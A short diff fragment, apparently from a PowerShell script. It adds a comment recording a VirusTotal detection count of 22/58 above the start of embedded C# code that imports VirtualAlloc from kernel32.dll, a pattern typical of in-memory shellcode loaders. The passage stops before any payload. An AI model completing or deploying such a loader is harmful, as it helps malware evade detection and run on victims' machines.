@@ -1,3 +1,5 @@
+// 22/58 virusTotal
+
 $code = ' 
 [DllImport("kernel32.dll")] 
 public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint 
